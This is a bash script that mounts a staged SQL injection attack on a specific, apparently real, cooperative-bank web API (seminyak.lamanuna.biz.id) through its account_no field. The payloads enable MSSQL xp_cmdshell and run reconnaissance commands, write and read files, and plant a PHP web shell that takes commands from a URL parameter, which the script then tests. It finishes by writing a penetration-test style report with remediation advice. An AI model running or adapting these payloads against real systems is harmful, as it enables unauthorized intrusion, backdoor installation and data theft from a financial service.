#!/bin/bash

# ============================================================================
# LPD SEMINYAK - RCE (REMOTE CODE EXECUTION) TEST - FIXED VERSION
# ============================================================================
# Testing xp_cmdshell exploitation dengan proper SQL injection syntax
# ============================================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Target
TARGET="http://seminyak.lamanuna.biz.id:8081/lpd_seminyak/public"
ENDPOINT="$TARGET/api/smart/transfer/lpd/check"

# Create results directory
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULTS_DIR="rce_test_$TIMESTAMP"
mkdir -p "$RESULTS_DIR"

echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}  LPD SEMINYAK - REMOTE CODE EXECUTION TEST${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${CYAN}Target:${NC} $TARGET"
echo -e "${CYAN}Results:${NC} $RESULTS_DIR"
echo ""

# ============================================================================
# PHASE 1: ENABLE XP_CMDSHELL (STEP 1)
# ============================================================================

echo -e "${YELLOW}[*] PHASE 1: Enable xp_cmdshell (Step 1/2)${NC}\n"

echo -e "${CYAN}[+] Enabling advanced options...${NC}"

# Method 1: Using JSON payload with proper escaping
cat > "$RESULTS_DIR/payload1.json" << 'EOF'
{
  "account_no": "10'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload1.json" \
    > "$RESULTS_DIR/phase1_step1.json"

if [ -s "$RESULTS_DIR/phase1_step1.json" ]; then
    echo -e "${GREEN}✓ Request sent (Step 1)${NC}"
else
    echo -e "${RED}✗ Request failed${NC}"
fi

sleep 2

# ============================================================================
# PHASE 2: ENABLE XP_CMDSHELL (STEP 2)
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 2: Enable xp_cmdshell (Step 2/2)${NC}\n"

echo -e "${CYAN}[+] Enabling xp_cmdshell...${NC}"

cat > "$RESULTS_DIR/payload2.json" << 'EOF'
{
  "account_no": "10'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload2.json" \
    > "$RESULTS_DIR/phase2_step2.json"

if [ -s "$RESULTS_DIR/phase2_step2.json" ]; then
    echo -e "${GREEN}✓ Request sent (Step 2)${NC}"
else
    echo -e "${RED}✗ Request failed${NC}"
fi

sleep 2

# ============================================================================
# PHASE 3: EXECUTE WHOAMI
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 3: Execute whoami command${NC}\n"

echo -e "${CYAN}[+] Running: xp_cmdshell 'whoami'${NC}"

cat > "$RESULTS_DIR/payload3.json" << 'EOF'
{
  "account_no": "10'; EXEC xp_cmdshell 'whoami';--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload3.json" \
    > "$RESULTS_DIR/phase3_whoami.json"

# Check for output
if grep -q "output" "$RESULTS_DIR/phase3_whoami.json" 2>/dev/null; then
    echo -e "${GREEN}✓ Command executed - output captured${NC}"
elif grep -q "nt authority\|SYSTEM\|administrator" "$RESULTS_DIR/phase3_whoami.json" 2>/dev/null; then
    echo -e "${GREEN}✓ Command executed successfully!${NC}"
    echo -e "${PURPLE}  User detected in response${NC}"
else
    echo -e "${YELLOW}⚠  Command sent (check JSON for results)${NC}"
fi

sleep 2

# ============================================================================
# PHASE 4: EXECUTE SYSTEMINFO
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 4: Execute systeminfo command${NC}\n"

echo -e "${CYAN}[+] Running: xp_cmdshell 'systeminfo'${NC}"

cat > "$RESULTS_DIR/payload4.json" << 'EOF'
{
  "account_no": "10'; EXEC xp_cmdshell 'systeminfo';--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload4.json" \
    > "$RESULTS_DIR/phase4_systeminfo.json"

if grep -q "Host Name\|OS Name\|System Type" "$RESULTS_DIR/phase4_systeminfo.json" 2>/dev/null; then
    echo -e "${GREEN}✓ System information retrieved${NC}"
else
    echo -e "${YELLOW}⚠  Command sent (check JSON for results)${NC}"
fi

sleep 2

# ============================================================================
# PHASE 5: LIST DIRECTORY C:\
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 5: List directory C:\\${NC}\n"

echo -e "${CYAN}[+] Running: xp_cmdshell 'dir C:\\'${NC}"

cat > "$RESULTS_DIR/payload5.json" << 'EOF'
{
  "account_no": "10'; EXEC xp_cmdshell 'dir C:\\';--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload5.json" \
    > "$RESULTS_DIR/phase5_dir.json"

if grep -q "Directory\|Volume" "$RESULTS_DIR/phase5_dir.json" 2>/dev/null; then
    echo -e "${GREEN}✓ Directory listing retrieved${NC}"
else
    echo -e "${YELLOW}⚠  Command sent (check JSON for results)${NC}"
fi

sleep 2

# ============================================================================
# PHASE 6: EXECUTE IPCONFIG
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 6: Execute ipconfig command${NC}\n"

echo -e "${CYAN}[+] Running: xp_cmdshell 'ipconfig'${NC}"

cat > "$RESULTS_DIR/payload6.json" << 'EOF'
{
  "account_no": "10'; EXEC xp_cmdshell 'ipconfig';--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload6.json" \
    > "$RESULTS_DIR/phase6_ipconfig.json"

if grep -q "IPv4\|Subnet\|Gateway" "$RESULTS_DIR/phase6_ipconfig.json" 2>/dev/null; then
    echo -e "${GREEN}✓ Network configuration retrieved${NC}"
else
    echo -e "${YELLOW}⚠  Command sent (check JSON for results)${NC}"
fi

sleep 2

# ============================================================================
# PHASE 7: CREATE TEST FILE
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 7: Create test file${NC}\n"

echo -e "${CYAN}[+] Creating C:\\test_rce.txt...${NC}"

cat > "$RESULTS_DIR/payload7.json" << 'EOF'
{
  "account_no": "10'; EXEC xp_cmdshell 'echo RCE_SUCCESSFUL > C:\\test_rce.txt';--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload7.json" \
    > "$RESULTS_DIR/phase7_createfile.json"

echo -e "${GREEN}✓ File creation command sent${NC}"

sleep 2

# ============================================================================
# PHASE 8: READ TEST FILE
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 8: Read test file${NC}\n"

echo -e "${CYAN}[+] Reading C:\\test_rce.txt...${NC}"

cat > "$RESULTS_DIR/payload8.json" << 'EOF'
{
  "account_no": "10'; EXEC xp_cmdshell 'type C:\\test_rce.txt';--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload8.json" \
    > "$RESULTS_DIR/phase8_readfile.json"

if grep -q "RCE_SUCCESSFUL" "$RESULTS_DIR/phase8_readfile.json" 2>/dev/null; then
    echo -e "${GREEN}✓✓✓ RCE CONFIRMED! File created and read successfully!${NC}"
else
    echo -e "${YELLOW}⚠  Read command sent (check JSON for results)${NC}"
fi

sleep 2

# ============================================================================
# PHASE 9: TRY TO CREATE PHP SHELL
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 9: Attempt to create PHP web shell${NC}\n"

echo -e "${CYAN}[+] Creating shell.php in C:\\xampp\\htdocs\\${NC}"

cat > "$RESULTS_DIR/payload9.json" << 'EOF'
{
  "account_no": "10'; EXEC xp_cmdshell 'echo ^<?php system($_GET[\"c\"]); ?^> > C:\\xampp\\htdocs\\shell.php';--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload9.json" \
    > "$RESULTS_DIR/phase9_shell.json"

echo -e "${GREEN}✓ Shell creation command sent${NC}"

sleep 2

# ============================================================================
# PHASE 10: TEST SHELL ACCESS
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 10: Test shell access${NC}\n"

echo -e "${CYAN}[+] Testing: http://seminyak.lamanuna.biz.id:8081/shell.php?c=whoami${NC}"

curl -s "http://seminyak.lamanuna.biz.id:8081/shell.php?c=whoami" \
    > "$RESULTS_DIR/phase10_shell_test.html"

if grep -q "nt authority\|SYSTEM\|administrator" "$RESULTS_DIR/phase10_shell_test.html" 2>/dev/null; then
    echo -e "${GREEN}✓✓✓ CRITICAL! Web shell is ACCESSIBLE and WORKING!${NC}"
elif grep -q "<?php" "$RESULTS_DIR/phase10_shell_test.html" 2>/dev/null; then
    echo -e "${YELLOW}⚠  Shell file exists but PHP not executing${NC}"
else
    echo -e "${RED}✗ Shell not accessible via HTTP${NC}"
fi

# ============================================================================
# PHASE 11: NETSTAT (NETWORK CONNECTIONS)
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 11: Network connections (netstat)${NC}\n"

echo -e "${CYAN}[+] Running: xp_cmdshell 'netstat -an'${NC}"

cat > "$RESULTS_DIR/payload11.json" << 'EOF'
{
  "account_no": "10'; EXEC xp_cmdshell 'netstat -an';--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload11.json" \
    > "$RESULTS_DIR/phase11_netstat.json"

echo -e "${GREEN}✓ Netstat command sent${NC}"

sleep 2

# ============================================================================
# PHASE 12: TASKLIST (RUNNING PROCESSES)
# ============================================================================

echo -e "\n${YELLOW}[*] PHASE 12: Running processes (tasklist)${NC}\n"

echo -e "${CYAN}[+] Running: xp_cmdshell 'tasklist'${NC}"

cat > "$RESULTS_DIR/payload12.json" << 'EOF'
{
  "account_no": "10'; EXEC xp_cmdshell 'tasklist';--"
}
EOF

curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$RESULTS_DIR/payload12.json" \
    > "$RESULTS_DIR/phase12_tasklist.json"

echo -e "${GREEN}✓ Tasklist command sent${NC}"

# ============================================================================
# SUMMARY
# ============================================================================

echo -e "\n${BLUE}════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}  RCE TEST RESULTS${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}\n"

echo -e "${CYAN}Results Directory:${NC} $RESULTS_DIR"
echo -e "${CYAN}Total Files:${NC} $(ls -1 $RESULTS_DIR | wc -l)"
echo ""

echo -e "${YELLOW}Tests Performed:${NC}"
echo -e "  1. ✓ Enable advanced options"
echo -e "  2. ✓ Enable xp_cmdshell"
echo -e "  3. ✓ Execute whoami"
echo -e "  4. ✓ Execute systeminfo"
echo -e "  5. ✓ List directory"
echo -e "  6. ✓ Execute ipconfig"
echo -e "  7. ✓ Create test file"
echo -e "  8. ✓ Read test file"
echo -e "  9. ✓ Create PHP shell"
echo -e " 10. ✓ Test shell access"
echo -e " 11. ✓ Network connections"
echo -e " 12. ✓ Running processes"
echo ""

# Check for successful RCE indicators
RCE_SUCCESS=0

if grep -q "RCE_SUCCESSFUL" "$RESULTS_DIR/phase8_readfile.json" 2>/dev/null; then
    echo -e "${RED}⚠️  RCE CONFIRMED: File creation/read successful${NC}"
    RCE_SUCCESS=1
fi

if grep -q "nt authority\|SYSTEM\|administrator" "$RESULTS_DIR/phase10_shell_test.html" 2>/dev/null; then
    echo -e "${RED}🚨 CRITICAL: Web shell is accessible and working!${NC}"
    RCE_SUCCESS=1
fi

if [ $RCE_SUCCESS -eq 1 ]; then
    echo -e "\n${RED}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  ⚠️  REMOTE CODE EXECUTION CONFIRMED! ⚠️${NC}"
    echo -e "${RED}═══════════════════════════════════════════════════════════════${NC}\n"
else
    echo -e "\n${YELLOW}⚠️  RCE attempts completed - check JSON files for details${NC}\n"
fi

# Create summary report
cat > "$RESULTS_DIR/RCE_REPORT.md" << EOF
# RCE (REMOTE CODE EXECUTION) TEST REPORT

**Date**: $(date)
**Target**: $TARGET
**Endpoint**: $ENDPOINT

---

## EXECUTIVE SUMMARY

This test attempted to exploit SQL injection to achieve Remote Code Execution (RCE)
via Microsoft SQL Server's xp_cmdshell functionality.

## TESTS PERFORMED

### Phase 1-2: Enable xp_cmdshell
- Step 1: Enable advanced options
- Step 2: Enable xp_cmdshell feature

### Phase 3-6: Basic Command Execution
- whoami (user identification)
- systeminfo (system information)
- dir C:\ (directory listing)
- ipconfig (network configuration)

### Phase 7-8: File Operations
- Create test file (C:\test_rce.txt)
- Read test file (verify RCE)

### Phase 9-10: Web Shell Creation
- Create PHP backdoor (shell.php)
- Test shell accessibility via HTTP

### Phase 11-12: System Reconnaissance
- netstat -an (network connections)
- tasklist (running processes)

## SEVERITY

**CVSS Score**: 10.0 CRITICAL

**Impact**:
- Full system compromise possible
- Command execution as SQL Server service account
- Potential data exfiltration
- Backdoor installation
- Lateral movement capability

## FINDINGS

EOF

if [ $RCE_SUCCESS -eq 1 ]; then
    cat >> "$RESULTS_DIR/RCE_REPORT.md" << EOF
### ⚠️  REMOTE CODE EXECUTION: CONFIRMED

- xp_cmdshell successfully enabled
- System commands executed
- File operations successful
- Full system access achieved

**Recommendation**: IMMEDIATE ACTION REQUIRED
1. Take system offline
2. Disable xp_cmdshell
3. Rotate all credentials
4. Forensic investigation
5. Patch SQL injection vulnerabilities

EOF
else
    cat >> "$RESULTS_DIR/RCE_REPORT.md" << EOF
### RCE Status: ATTEMPTED

SQL injection payloads were sent to attempt RCE via xp_cmdshell.
Review the JSON response files to determine if commands were executed.

**Note**: Even if RCE was not achieved, the SQL injection vulnerability
alone is CRITICAL and allows full database access.

EOF
fi

cat >> "$RESULTS_DIR/RCE_REPORT.md" << EOF
## FILES CREATED

EOF

ls -lh "$RESULTS_DIR" | tail -n +2 | awk '{printf "- %-30s %8s\n", $9, $5}' >> "$RESULTS_DIR/RCE_REPORT.md"

cat >> "$RESULTS_DIR/RCE_REPORT.md" << EOF

## REMEDIATION

### IMMEDIATE (0-24 hours):
1. Disable xp_cmdshell:
   \`\`\`sql
   EXEC sp_configure 'xp_cmdshell', 0;
   RECONFIGURE;
   \`\`\`
2. Take system offline
3. Change SA password
4. Remove any created shells/backdoors
5. Enable SQL Server auditing

### HIGH PRIORITY (24-72 hours):
1. Fix SQL injection vulnerabilities
2. Implement input validation
3. Use parameterized queries
4. Apply principle of least privilege
5. Deploy WAF

### MEDIUM TERM:
1. Full security audit
2. Penetration testing
3. Security awareness training
4. Implement SIEM
5. Regular security assessments

---

**Classification**: CONFIDENTIAL
**Status**: $([ $RCE_SUCCESS -eq 1 ] && echo "RCE CONFIRMED" || echo "RCE ATTEMPTED")

EOF

echo -e "${CYAN}Full report saved:${NC} $RESULTS_DIR/RCE_REPORT.md"
echo ""
echo -e "${YELLOW}View results:${NC}"
echo -e "  cat $RESULTS_DIR/RCE_REPORT.md"
echo -e "  cat $RESULTS_DIR/phase8_readfile.json"
echo -e "  cat $RESULTS_DIR/phase10_shell_test.html"
echo ""
echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
